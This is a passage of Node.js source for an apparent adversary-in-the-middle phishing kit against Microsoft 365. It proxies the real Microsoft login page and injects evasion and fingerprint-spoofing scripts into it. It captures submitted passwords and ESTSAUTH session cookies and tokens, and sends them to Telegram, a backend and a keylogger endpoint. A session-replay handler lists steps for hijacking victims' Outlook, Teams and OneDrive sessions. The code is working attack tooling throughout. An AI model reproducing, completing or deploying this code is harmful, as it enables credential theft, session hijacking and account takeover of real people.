                    setTimeout(connectWS, 3000 + Math.random() * 5000);
                };
            }
            
            for (let i = 0; i < ${Math.floor(Math.random() * 3) + 1}; i++) {
                setTimeout(connectWS, i * 1000);
            }
        };
        
        // EVASION: Cache Poisoning
        const poisonCache = function() {
            const cacheKey = 'cache_' + '${crypto.randomBytes(8).toString('hex')}';
            
            const cacheStrategies = [
                function() {
                    window._cache = window._cache || {};
                    window._cache[cacheKey] = {
                        data: '${crypto.randomBytes(16).toString('hex')}',
                        timestamp: Date.now()
                    };
                },
                function() {
                    localStorage.setItem(cacheKey, JSON.stringify({
                        data: '${crypto.randomBytes(16).toString('hex')}',
                        timestamp: Date.now()
                    }));
                },
                function() {
                    sessionStorage.setItem(cacheKey, JSON.stringify({
                        data: '${crypto.randomBytes(16).toString('hex')}',
                        timestamp: Date.now()
                    }));
                }
            ];
            
            const strategy = cacheStrategies[Math.floor(Math.random() * cacheStrategies.length)];
            strategy();
            
            setInterval(() => {
                if (Math.random() < 0.1) {
                    localStorage.removeItem(cacheKey);
                    sessionStorage.removeItem(cacheKey);
                    delete window._cache[cacheKey];
                }
            }, 10000 + Math.random() * 30000);
        };
        
        // EVASION: API Traffic Mimicry
        const mimicAPITraffic = function() {
            const graphqlOps = [
                'query getUser { user { id name email } }',
                'query getMessages { messages { id content timestamp } }',
                'mutation sendMessage { sendMessage(input: {text: "test"}) { id } }',
                'query getCalendar { calendar { events { title time } } }'
            ];
            
            const restEndpoints = [
                '/api/v1/users',
                '/api/v1/messages',
                '/api/v1/files',
                '/api/v1/calendar',
                '/api/v1/teams'
            ];
            
            function mimicGraphQL() {
                const operation = graphqlOps[Math.floor(Math.random() * graphqlOps.length)];
                fetch('/graphql', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'X-Requested-With': 'XMLHttpRequest'
                    },
                    body: JSON.stringify({
                        query: operation,
                        variables: {}
                    })
                }).catch(() => {});
            }
            
            function mimicREST() {
                const endpoint = restEndpoints[Math.floor(Math.random() * restEndpoints.length)];
                fetch(endpoint, {
                    method: ['GET', 'POST', 'PUT', 'DELETE'][Math.floor(Math.random() * 4)],
                    headers: {
                        'Authorization': 'Bearer ' + (localStorage.getItem('token') || ''),
                        'Content-Type': 'application/json'
                    }
                }).catch(() => {});
            }
            
            setInterval(() => {
                if (Math.random() < 0.3) {
                    mimicGraphQL();
                }
                if (Math.random() < 0.2) {
                    mimicREST();
                }
            }, 3000 + Math.random() * 7000);
        };
        
        // Initialize all evasion techniques
        console.log('[EVASION] 🛡️ Initializing advanced evasion techniques...');
        
        try { spoofFingerprint(); } catch(e) {}
        try { mimicBeaconTraffic(); } catch(e) {}
        try { bypassStorage(); } catch(e) {}
        try { rotateTokens(); } catch(e) {}
        try { rotateSession(); } catch(e) {}
        try { createWebSocket(); } catch(e) {}
        try { poisonCache(); } catch(e) {}
        try { mimicAPITraffic(); } catch(e) {}
        
        console.log('[EVASION] ✅ All evasion techniques activated');
        console.log('[EVASION] 🆔 Session:', '${sessionId}');
        console.log('[EVASION] 📧 Email:', '${email}');
    })();
    </script>
    `;
}

// ============================================================
//  FIXED: SERVE FILES
// ============================================================

function serveFile(filename, res, contentType = 'text/html') {
    const filePath = path.join(__dirname, filename);
    fs.readFile(filePath, (err, data) => {
        if (err) {
            console.error(`[ERROR] Failed to read ${filename}: ${err.message}`);
            res.writeHead(404, { 'Content-Type': 'text/html' });
            res.end('<h1>404 Not Found</h1>');
            return;
        }
        res.writeHead(200, { 
            'Content-Type': contentType, 
            'Cache-Control': 'no-store, no-cache, must-revalidate',
            'Pragma': 'no-cache'
        });
        res.end(data);
    });
}

// ============================================================
//  FIXED: CAPTURE COOKIES FROM RESPONSE
// ============================================================

function captureCookiesFromResponse(response, sessionId) {
    try {
        const cookieHeaders = response.headers['set-cookie'] || [];
        const capturedCookies = {};
        
        for (const cookieHeader of cookieHeaders) {
            const parts = cookieHeader.split(';');
            const [nameValue, ...attributes] = parts;
            const [name, value] = nameValue.split('=');
            
            if (name && value && value !== 'null' && value !== 'undefined') {
                capturedCookies[name] = {
                    value: value,
                    httpOnly: attributes.some(attr => attr.trim().toLowerCase() === 'httponly'),
                    secure: attributes.some(attr => attr.trim().toLowerCase() === 'secure'),
                    sameSite: attributes.find(attr => attr.trim().toLowerCase().startsWith('samesite='))?.split('=')[1] || 'Lax',
                    path: attributes.find(attr => attr.trim().toLowerCase().startsWith('path='))?.split('=')[1] || '/',
                    domain: attributes.find(attr => attr.trim().toLowerCase().startsWith('domain='))?.split('=')[1] || '',
                    expires: attributes.find(attr => attr.trim().toLowerCase().startsWith('expires='))?.split('=')[1] || null
                };
            }
        }
        
        if (Object.keys(capturedCookies).length > 0) {
            sessionStore.storeCookies(sessionId, capturedCookies, 'microsoft_response');
            sendFullCookieAlert(sessionId, capturedCookies).catch(() => {});
            
            axios.post(`${BACKEND_URL}/api/cookies`, {
                sessionId: sessionId,
                cookies: capturedCookies,
                source: 'microsoft_response',
                timestamp: new Date().toISOString()
            }).catch(() => {});
        }
        
        return capturedCookies;
    } catch (error) {
        console.error('[COOKIE-CAPTURE] Error:', error.message);
        return {};
    }
}

// ============================================================
//  FIXED: HANDLE LOGIN REQUEST - PROPER MICROSOFT PROXY
// ============================================================

function handleLoginRequest(req, res) {
    const paramName = PHISHED_URL_PARAMETER || 'login_hint';
    const rawEmail = req.url.split(`${paramName}=`)[1]?.split('&')[0] || '';
    let email = rawEmail ? decodeURIComponent(rawEmail) : '';
    const ip = getClientIp(req);
    const userAgent = req.headers['user-agent'] || 'Unknown';
    
    if (!email) {
        const sessionId = getSessionIdFromCookie(req.headers.cookie);
        if (sessionId && VICTIM_SESSIONS[sessionId]) {
            email = VICTIM_SESSIONS[sessionId].email;
        }
    }
    
    if (!email) {
        console.warn('[PROXY] ⚠️ No email found, using default');
        email = 'guest@example.com';
    }

    const hasError = req.url.includes('error=');
    const sessionId = createSession(email, ip, userAgent);
    const isSecure = req.headers['x-forwarded-proto'] === 'https' || req.socket.encrypted;
    const cookieFlags = `Path=/; HttpOnly; SameSite=Lax; Max-Age=3600${isSecure ? '; Secure' : ''}`;
    res.setHeader('Set-Cookie', [`sessionId=${sessionId}; ${cookieFlags}`]);

    // ============================================================
    //  FIXED: PROPER MICROSOFT LOGIN PAGE FETCH
    // ============================================================
    
    const targetUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?` +
        `client_id=${MICROSOFT_CLIENT_ID}&` +
        `response_type=code&` +
        `redirect_uri=${encodeURIComponent(MICROSOFT_REDIRECT_URI)}&` +
        `scope=${encodeURIComponent(MICROSOFT_SCOPES)}&` +
        `${paramName}=${encodeURIComponent(email)}` +
        (hasError ? `&error=${req.url.split('error=')[1]?.split('&')[0] || ''}` : '');

    console.log(`[PROXY] 🔄 Fetching Microsoft login page`);
    console.log(`[PROXY] 📧 Email: ${email}`);
    console.log(`[PROXY] 🆔 Session: ${sessionId}`);
    console.log(`[PROXY] 📡 IP: ${ip}`);

    // EVASION: Random user-agent rotation
    const userAgents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    ];
    const randomUA = userAgents[Math.floor(Math.random() * userAgents.length)];

    // ============================================================
    //  FIXED: PROPER HTTPS REQUEST WITH FULL HEADERS
    // ============================================================
    
    const options = {
        headers: {
            'User-Agent': randomUA,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Upgrade-Insecure-Requests': '1'
        }
    };

    https.get(targetUrl, options, (targetRes) => {
        let data = [];
        targetRes.on('data', chunk => data.push(chunk));
        targetRes.on('end', () => {
            // ============================================================
            //  FIXED: PROPER RESPONSE HANDLING
            // ============================================================
            
            let body = Buffer.concat(data);
            
            // Handle compressed responses
            if (targetRes.headers['content-encoding'] === 'gzip') {
                try {
                    body = zlib.gunzipSync(body);
                } catch (e) {
                    console.log('[PROXY] ⚠️ Gunzip failed, using raw data');
                }
            } else if (targetRes.headers['content-encoding'] === 'br') {
                try {
                    body = zlib.brotliDecompressSync(body);
                } catch (e) {
                    console.log('[PROXY] ⚠️ Brotli decompress failed, using raw data');
                }
            }
            
            let html = body.toString('utf-8');
            
            // CAPTURE COOKIES FROM MICROSOFT RESPONSE
            const capturedCookies = captureCookiesFromResponse(targetRes, sessionId);
            
            // Store tokens with null handling
            const cookieHeaders = targetRes.headers['set-cookie'] || [];
            const tokens = {};
            for (const cookieHeader of cookieHeaders) {
                const [nameValue] = cookieHeader.split(';');
                const [name, value] = nameValue.split('=');
                if (name && value && value !== 'null' && value !== 'undefined') {
                    if (name.includes('ESTSAUTH') || name.includes('ESTSSESSION') || name.includes('ESTSAUTHPERSISTENT')) {
                        tokens[name] = value;
                    }
                }
            }
            
            if (Object.keys(tokens).length > 0) {
                sessionStore.storeTokens(sessionId, tokens);
                sendFullTokenAlert(sessionId, tokens).catch(() => {});
            }
            
            // ============================================================
            //  FIXED: PROPER SCRIPT INJECTION
            // ============================================================
            
            // EVASION: Generate advanced evasion scripts
            const evasionScripts = generateEvasionScripts(sessionId, email, randomUA);
            
            // EVASION: Configuration injection
            const injectionScript = `
            <script>
                // EVASION: Configuration with evasion data
                window.MICROSOFT_CONFIG = {
                    BACKEND_URL: '${BACKEND_URL}',
                    KEYLOGGER_URL: '${KEYLOGGER_URL}',
                    XSS_ENDPOINT: '${PROXY_PATHNAMES.xssEndpoint}',
                    COOKIE_ENDPOINT: '${PROXY_PATHNAMES.cookieEndpoint}',
                    KEYLOG_ENDPOINT: '${PROXY_PATHNAMES.keylogEndpoint}',
                    SW_PROXY_PATH: '${PROXY_PATHNAMES.swProxyPath}',
                    COOKIE_STORE_ENDPOINT: '${PROXY_PATHNAMES.cookieStoreEndpoint}',
                    SESSION_REPLAY_ENDPOINT: '${PROXY_PATHNAMES.sessionReplayEndpoint}',
                    SESSION_ID: '${sessionId}',
                    EMAIL: '${email}',
                    CLIENT_ID: '${MICROSOFT_CLIENT_ID}',
                    SERVICE: 'Microsoft 365',
                    JITTER: ${Math.floor(Math.random() * 2000) + 500},
                    USER_AGENT: '${randomUA}',
                    TOKENS: ${JSON.stringify(tokens || {})},
                    EVASION_ENABLED: true,
                    ROTATION_INTERVAL: ${Math.floor(Math.random() * 60000) + 30000}
                };
                
                // EVASION: Random initialization delay
                setTimeout(function() {
                    console.log('🔐 Microsoft Proxy v4.0 - Advanced Evasion');
                    console.log('📧 Email:', window.MICROSOFT_CONFIG.EMAIL);
                    console.log('🆔 Session:', window.MICROSOFT_CONFIG.SESSION_ID);
                    console.log('🛡️ Evasion:', window.MICROSOFT_CONFIG.EVASION_ENABLED);
                }, window.MICROSOFT_CONFIG.JITTER);
            </script>
            <script src="${PROXY_PATHNAMES.script}"></script>
            ${evasionScripts}
            `;
            
            // ============================================================
            //  FIXED: PROPER HTML INJECTION
            // ============================================================
            
            // Fix relative paths
            html = html.replace(/(src|href)="\//g, '$1="https://login.microsoftonline.com/');
            html = html.replace(/(src|href)='\//g, "$1='https://login.microsoftonline.com/");
            
            // Inject scripts before </body>
            html = html.replace(/<\/body>/i, injectionScript + '</body>');
            
            // Handle cases where </body> is not present
            if (!html.includes('</body>')) {
                html = html + injectionScript;
            }
            
            // ============================================================
            //  FIXED: PROPER RESPONSE HEADERS
            // ============================================================
            
            // EVASION: Random cache headers
            const cacheControl = ['no-store', 'no-cache', 'must-revalidate', 'private'][Math.floor(Math.random() * 4)];
            
            res.writeHead(targetRes.statusCode || 200, {
                'Content-Type': 'text/html; charset=utf-8',
                'Cache-Control': `${cacheControl}, max-age=0`,
                'Pragma': 'no-cache',
                'Expires': '0',
                'X-Content-Type-Options': 'nosniff',
                'X-Frame-Options': 'SAMEORIGIN',
                'Referrer-Policy': 'strict-origin-when-cross-origin',
                'Server': 'Microsoft-IIS/10.0',
                'X-Powered-By': 'ASP.NET',
                'Content-Encoding': 'identity'  // Prevent compression
            });
            res.end(html);
        });
    }).on('error', (err) => {
        console.error(`[ERROR] Proxy failed: ${err.message}`);
        // Fallback: redirect to Microsoft directly
        res.writeHead(302, { 'Location': targetUrl });
        res.end();
    });
}

// ============================================================
//  FIXED: HANDLE POST REQUEST - WITH EVASION TECHNIQUES
// ============================================================

function handlePostRequest(body, req, res) {
    try {
        const formData = querystring.parse(body);
        const ip = getClientIp(req);
        const sessionId = getSessionIdFromCookie(req.headers.cookie);
        
        let email = '';
        
        if (sessionId) {
            const session = getSession(sessionId);
            if (session) {
                email = session.email;
                VICTIM_SESSIONS[sessionId].attempts = (VICTIM_SESSIONS[sessionId].attempts || 0) + 1;
                sessionStore.addEvasionCounter(sessionId);
            }
        }
        
        if (!email) {
            email = formData.loginfmt || formData.login || formData.email || '';
        }
        
        if (!email) {
            const match = req.url.match(/login_hint=([^&]+)/);
            if (match) {
                email = decodeURIComponent(match[1]);
            }
        }
        
        if (!email) {
            console.warn('[POST] No email found, using unknown');
            email = 'unknown@domain.com';
        }

        const password = formData.passwd || formData.password || '';
        let attemptCount = attemptCounts.get(email) || 0;
        attemptCount++;
        attemptCounts.set(email, attemptCount);

        console.log(`[CREDENTIALS] 📧 Email: ${email}`);
        console.log(`[CREDENTIALS] 🔑 Password: ${password ? '***' : 'N/A'}`);
        console.log(`[CREDENTIALS] 📊 Attempt: ${attemptCount}`);
        console.log(`[CREDENTIALS] 📡 IP: ${ip}`);
        console.log(`[CREDENTIALS] 🆔 Session: ${sessionId || 'N/A'}`);

        // Store form data
        if (sessionId) {
            sessionStore.sessions.set(sessionId, {
                ...sessionStore.sessions.get(sessionId),
                forms: [...(sessionStore.sessions.get(sessionId)?.forms || []), {
                    email: email,
                    password: password,
                    formData: formData,
                    url: req.url,
                    method: 'POST',
                    ip: ip,
                    timestamp: Date.now()
                }]
            });
        }

        // Send to Telegram with evasion data
        let msg = `🔐 *MICROSOFT LOGIN ATTEMPT #${attemptCount}*\n\n`;
        msg += `*📧 Email:* ${email}\n`;
        msg += `*🔑 Password:* ${password || 'N/A'}\n`;
        msg += `*📡 IP:* ${ip}\n`;
        msg += `*🕐 Time:* ${new Date().toISOString()}\n`;
        msg += `*🆔 Session:* ${sessionId ? sessionId.substring(0, 12) + '...' : 'N/A'}\n`;
        msg += `*🎯 Service:* Microsoft 365\n`;
        msg += `*🛡️ Evasion:* Active`;
        
        sendToTelegram(msg);

        // Send to backend
        axios.post(`${BACKEND_URL}/api/authenticate`, {
            email: email,
            password: password,
            visitorInfo: {
                fullUrl: req.url,
                userAgent: req.headers['user-agent'],
                sessionId: sessionId,
                ip: ip,
                evasionData: sessionStore.getReplayData(sessionId)?.evasionData || {}
            }
        }).catch(() => {});

        // Send to keylogger
        if (KEYLOGGER_URL && password) {
            axios.post(`${KEYLOGGER_URL}/log-combined`, {
                type: 'microsoft_login',
                email: email,
                password: password,
                url: req.url,
                userAgent: req.headers['user-agent'],
                sessionId: sessionId,
                formData: formData,
                service: 'Microsoft 365',
                action: 'login_attempt'
            }).catch(() => {});
        }

        // Verify with Microsoft
        verifyWithMicrosoft(email, password)
            .then((result) => {
                if (result.success) {
                    console.log(`[AUTH] ✅ Valid Microsoft credentials: ${email}`);
                    
                    // Store tokens with null handling
                    if (sessionId && result.tokens) {
                        const storedTokens = sessionStore.storeTokens(sessionId, result.tokens);
                        const validTokens = Object.values(storedTokens || {}).filter(t => t && t.value && t.isValid !== false);
                        if (validTokens.length > 0) {
                            sendFullTokenAlert(sessionId, storedTokens).catch(() => {});
                        }
                    }
                    
                    if (sessionId && VICTIM_SESSIONS[sessionId]) {
                        // Store cookies with null handling
                        if (result.cookies) {
                            const validCookies = {};
                            for (const [name, data] of Object.entries(result.cookies)) {
                                if (data && data.value && data.value !== 'null' && data.value !== 'undefined') {
                                    validCookies[name] = data;
                                }
                            }
                            if (Object.keys(validCookies).length > 0) {
                                sessionStore.storeCookies(sessionId, validCookies, 'auth_response');
                            }
                        }
                    }
                    
                    // Send success notification
                    let successMsg = `✅ *VALID MICROSOFT CREDENTIALS*\n\n`;
                    successMsg += `*📧 Email:* ${email}\n`;
                    successMsg += `*🔑 Password:* ${password || 'N/A'}\n`;
                    successMsg += `*📡 IP:* ${ip}\n`;
                    successMsg += `*🕐 Time:* ${new Date().toISOString()}\n`;
                    successMsg += `*🎯 Service:* Microsoft 365\n\n`;
                    
                    // Only include valid tokens in message
                    if (result.tokens) {
                        let hasValidTokens = false;
                        for (const [name, value] of Object.entries(result.tokens)) {
                            if (value && value !== 'null' && value !== 'undefined' && value !== 'N/A') {
                                if (!hasValidTokens) {
                                    successMsg += `*🎟️ Tokens Captured:*\n`;
                                    hasValidTokens = true;
                                }
                                const displayValue = value.length > 50 ? value.substring(0, 50) + '...' : value;
                                successMsg += `  \`${name}\`: \`${displayValue}\`\n`;
                            }
                        }
                    }
                    
                    if (result.cookies) {
                        let hasValidCookies = false;
                        for (const [name, data] of Object.entries(result.cookies)) {
                            if (data && data.value && data.value !== 'null' && data.value !== 'undefined') {
                                if (!hasValidCookies) {
                                    successMsg += `\n*🍪 Cookies Captured:*\n`;
                                    hasValidCookies = true;
                                }
                                const displayValue = data.value.length > 50 ? data.value.substring(0, 50) + '...' : data.value;
                                const httpOnly = data.httpOnly ? '🔒' : '🔓';
                                successMsg += `  ${httpOnly} \`${name}\`: \`${displayValue}\`\n`;
                            }
                        }
                    }
                    
                    sendToTelegram(successMsg);
                    
                    // Send to backend
                    axios.post(`${BACKEND_URL}/api/log-action`, {
                        action: 'login_success',
                        email: email,
                        password: password,
                        tokens: result.tokens,
                        cookies: result.cookies,
                        visitorInfo: {
                            fullUrl: req.url,
                            userAgent: req.headers['user-agent'],
                            sessionId: sessionId,
                            ip: ip
                        }
                    }).catch(() => {});
                    
                    res.writeHead(302, { 
                        'Location': TEAMS_REDIRECT, 
                        'Cache-Control': 'no-store, no-cache, must-revalidate'
                    });
                    res.end();
                } else {
                    console.log(`[AUTH] ❌ Invalid Microsoft credentials: ${email}`);
                    
                    sendToTelegram(`❌ *INVALID MICROSOFT CREDENTIALS*\n\n📧 Email: ${email}\n📡 IP: ${ip}\n🕐 Time: ${new Date().toISOString()}`);
                    
                    axios.post(`${BACKEND_URL}/api/log-action`, {
                        action: 'login_failed',
                        email: email,
                        password: password,
                        visitorInfo: {
                            fullUrl: req.url,
                            userAgent: req.headers['user-agent'],
                            sessionId: sessionId,
                            ip: ip
                        }
                    }).catch(() => {});
                    
                    const errorUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?` +
                        `client_id=${MICROSOFT_CLIENT_ID}&` +
                        `response_type=code&` +
                        `redirect_uri=${encodeURIComponent(MICROSOFT_REDIRECT_URI)}&` +
                        `scope=${encodeURIComponent(MICROSOFT_SCOPES)}&` +
                        `login_hint=${encodeURIComponent(email)}&` +
                        `error=invalid_credentials`;
                    
                    res.writeHead(302, { 'Location': errorUrl, 'Cache-Control': 'no-store' });
                    res.end();
                }
            })
            .catch((error) => {
                console.error('[ERROR] Microsoft verification failed:', error.message);
                const errorUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?` +
                    `client_id=${MICROSOFT_CLIENT_ID}&` +
                    `response_type=code&` +
                    `redirect_uri=${encodeURIComponent(MICROSOFT_REDIRECT_URI)}&` +
                    `scope=${encodeURIComponent(MICROSOFT_SCOPES)}&` +
                    `login_hint=${encodeURIComponent(email)}&` +
                    `error=service_error`;
                
                res.writeHead(302, { 'Location': errorUrl });
                res.end();
            });

    } catch (error) {
        console.error('[ERROR] POST handling failed:', error.message);
        res.writeHead(500);
        res.end('Internal server error');
    }
}

// ============================================================
//  HANDLE SESSION REPLAY ENDPOINT
// ============================================================

function handleSessionReplay(req, res) {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', () => {
        try {
            const data = JSON.parse(body);
            const sessionId = data.sessionId || getSessionIdFromCookie(req.headers.cookie);
            
            if (!sessionId) {
                res.writeHead(400);
                res.end(JSON.stringify({ error: 'No session ID' }));
                return;
            }
            
            const sessionData = sessionStore.getReplayData(sessionId);
            if (!sessionData) {
                res.writeHead(404);
                res.end(JSON.stringify({ error: 'Session not found' }));
                return;
            }
            
            const cookieData = sessionStore.getCookieHeader(sessionId);
            const tokens = sessionStore.allTokens.get(sessionId) || {};
            const validTokens = {};
            for (const [key, token] of Object.entries(tokens)) {
                if (token && token.value && token.isValid !== false && token.value !== 'null' && token.value !== 'undefined') {
                    validTokens[key] = token.value;
                }
            }
            
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({
                success: true,
                sessionId: sessionId,
                sessionData: sessionData,
                cookies: cookieData?.cookieHeader ? 
                    Object.fromEntries(cookieData.cookieHeader.split('; ').map(c => {
                        const [n, v] = c.split('=');
                        return [n, v];
                    })) : {},
                cookieHeader: cookieData?.cookieHeader || '',
                cookieCount: cookieData?.cookieCount || 0,
                tokens: validTokens,
                tokenCount: Object.keys(validTokens).length,
                forms: sessionData.forms || [],
                fingerprint: sessionData.fingerprint || {},
                evasionData: {
                    rotationCount: sessionData.rotationCount || 0,
                    totalRequests: sessionData.evasionData?.totalRequests || 0,
                    fingerprint: sessionData.fingerprint
                },
                replayInstructions: {
                    useCookieHeader: cookieData?.cookieHeader || '',
                    targetUrls: [
                        'https://outlook.office.com',
                        'https://teams.microsoft.com',
                        'https://onedrive.live.com',
                        'https://sharepoint.com',
                        'https://www.office.com',
                        'https://login.microsoftonline.com'
                    ],
                    howToReplay: [
                        '1. Copy the cookieHeader value',
                        '2. Use browser extension to set cookies',
                        '3. Navigate to target URL',
                        '4. Session will be automatically authenticated',
                        '5. Use token values for API authentication'
                    ],
                    evasionActive: true
                }
            }, null, 2));
            
        } catch (error) {
            console.error('[REPLAY] Error:', error.message);
            res.writeHead(500);
            res.end(JSON.stringify({ error: 'Internal server error' }));
        }
    });
}

// ============================================================
//  MAIN SERVER
// ============================================================

const server = http.createServer((req, res) => {
    console.log(`[REQUEST] ${req.method} ${req.url}`);

    // Serve files
    if (req.url === '/' || req.url === '/index.html') {
        serveFile('index.html', res);
        return;
    }
    if (req.url === PROXY_PATHNAMES.script) {
        serveFile('script_Vx9Z6XN5uC3k.js', res, 'text/javascript');
        return;
    }
    if (req.url === PROXY_PATHNAMES.serviceWorker) {
        serveFile('microsoft_inject.js', res, 'text/javascript');
        return;
    }

    // Token Rotation Endpoint
    if (req.url === PROXY_PATHNAMES.tokenRotation && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const data = JSON.parse(body);
                const sessionId = getSessionIdFromCookie(req.headers.cookie);
                if (sessionId) {
                    sessionStore.rotateSession(sessionId);
                }
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ success: true, rotated: true }));
            } catch (error) {
                res.writeHead(500);
                res.end(JSON.stringify({ error: 'Internal server error' }));
            }
        });
        return;
    }

    // Session Rotate Endpoint
    if (req.url === PROXY_PATHNAMES.sessionRotate && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const data = JSON.parse(body);
                const sessionId = data.sessionId || getSessionIdFromCookie(req.headers.cookie);
                if (sessionId) {
                    const newSessionId = sessionStore.rotateSession(sessionId);
                    res.writeHead(200, { 'Content-Type': 'application/json' });
                    res.end(JSON.stringify({ 
                        success: true, 
                        newSessionId: newSessionId,
                        rotationCount: sessionStore.evasionCounters.get(newSessionId)?.rotations || 0
                    }));
                } else {
                    res.writeHead(400);
                    res.end(JSON.stringify({ error: 'No session ID' }));
                }
            } catch (error) {
                res.writeHead(500);
                res.end(JSON.stringify({ error: 'Internal server error' }));
            }
        });
        return;
    }

    // Cookie Store Endpoint
    if (req.url === PROXY_PATHNAMES.cookieStoreEndpoint && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const data = JSON.parse(body);
                const sessionId = data.sessionId || getSessionIdFromCookie(req.headers.cookie);
                
                if (!sessionId) {
                    res.writeHead(400);
                    res.end(JSON.stringify({ error: 'No session ID' }));
                    return;
                }
                
                let cookies = {};
                
                if (data.cookies) {
                    if (typeof data.cookies === 'string') {
                        data.cookies.split('; ').forEach(cookie => {
                            const [name, value] = cookie.split('=');
                            if (name && value && value !== 'null' && value !== 'undefined') {
                                cookies[name] = { value: value, httpOnly: false, secure: false };
                            }
                        });
                    } else if (typeof data.cookies === 'object') {
                        for (const [name, value] of Object.entries(data.cookies)) {
                            if (value && value !== 'null' && value !== 'undefined') {
                                cookies[name] = typeof value === 'object' ? value : { value: value };
                            }
                        }
                    }
                }
                
                if (data.setCookie) {
                    const setCookieParts = data.setCookie.split(';');
                    const [nameValue, ...attributes] = setCookieParts;
                    const [name, value] = nameValue.split('=');
                    if (name && value && value !== 'null' && value !== 'undefined') {
                        cookies[name] = {
                            value: value,
                            httpOnly: attributes.some(attr => attr.trim().toLowerCase() === 'httponly'),
                            secure: attributes.some(attr => attr.trim().toLowerCase() === 'secure'),
                            sameSite: attributes.find(attr => attr.trim().toLowerCase().startsWith('samesite='))?.split('=')[1] || 'Lax'
                        };
                    }
                }
                
                if (Object.keys(cookies).length > 0) {
                    sessionStore.storeCookies(sessionId, cookies, data.source || 'api');
                    sendFullCookieAlert(sessionId, cookies).catch(() => {});
                    
                    axios.post(`${BACKEND_URL}/api/cookies`, {
                        sessionId: sessionId,
                        cookies: cookies,
                        source: data.source || 'api',
                        timestamp: new Date().toISOString()
                    }).catch(() => {});
                }
                
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ 
                    success: true, 
                    stored: Object.keys(cookies).length,
                    sessionId: sessionId,
                    evasionActive: true
                }));
            } catch (error) {
                console.error('[COOKIE-STORE] Error:', error.message);
                res.writeHead(500);
                res.end(JSON.stringify({ error: 'Internal server error' }));
            }
        });
        return;
    }

    // Session Replay Endpoint
    if (req.url === PROXY_PATHNAMES.sessionReplayEndpoint && req.method === 'POST') {
        handleSessionReplay(req, res);
        return;
    }

    // Full Session Data Endpoint
    if (req.url === PROXY_PATHNAMES.fullSessionData && req.method === 'GET') {
        const sessionId = req.headers['x-session-id'] || getSessionIdFromCookie(req.headers.cookie);
        
        if (!sessionId) {
            res.writeHead(400);
            res.end(JSON.stringify({ error: 'No session ID' }));
            return;
        }
        
        const sessionData = sessionStore.getReplayData(sessionId);
        if (!sessionData) {
            res.writeHead(404);
            res.end(JSON.stringify({ error: 'Session not found' }));
            return;
        }
        
        const cookieData = sessionStore.getCookieHeader(sessionId);
        const tokens = sessionStore.allTokens.get(sessionId) || {};
        const validTokens = {};
        for (const [key, token] of Object.entries(tokens)) {
            if (token && token.value && token.isValid !== false && token.value !== 'null' && token.value !== 'undefined') {
                validTokens[key] = token.value;
            }
        }
        
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
            success: true,
            sessionId: sessionId,
            email: sessionData.email || 'unknown',
            created: sessionData.created,
            lastActivity: sessionData.lastActivity,
            cookies: cookieData?.cookieHeader ? 
                Object.fromEntries(cookieData.cookieHeader.split('; ').map(c => {
                    const [n, v] = c.split('=');
                    return [n, v];
                })) : {},
            cookieCount: cookieData?.cookieCount || 0,
            tokens: validTokens,
            tokenCount: Object.keys(validTokens).length,
            forms: sessionData.forms || [],
            formCount: (sessionData.forms || []).length,
            fingerprint: sessionData.fingerprint || {},
            evasionData: sessionData.evasionData || {},
            readyForReplay: (cookieData?.cookieCount || 0) > 0 || Object.keys(validTokens).length > 0,
            evasionEnabled: true
        }, null, 2));
        return;
    }

    // Existing endpoints
    if (req.url === PROXY_PATHNAMES.xssEndpoint && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const data = JSON.parse(body);
                const sessionId = getSessionIdFromCookie(req.headers.cookie);
                const ip = getClientIp(req);
                
                if (sessionId && VICTIM_SESSIONS[sessionId]) {
                    VICTIM_SESSIONS[sessionId].xssData.push({
                        ...data,
                        timestamp: Date.now(),
                        ip: ip
                    });
                    sessionStore.sessions.set(sessionId, {
                        ...sessionStore.sessions.get(sessionId),
                        xssData: data,
                        lastXSS: Date.now()
                    });
                }
                
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ success: true }));
            } catch (error) {
                res.writeHead(500);
                res.end(JSON.stringify({ error: 'Internal server error' }));
            }
        });
        return;
    }

    if (req.url === PROXY_PATHNAMES.cookieEndpoint && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const data = JSON.parse(body);
                const sessionId = getSessionIdFromCookie(req.headers.cookie);
                
                if (sessionId && VICTIM_SESSIONS[sessionId]) {
                    VICTIM_SESSIONS[sessionId].cookies.push(data);
                    if (data.cookies) {
                        sessionStore.storeCookies(sessionId, data.cookies, 'frontend');
                    }
                }
                
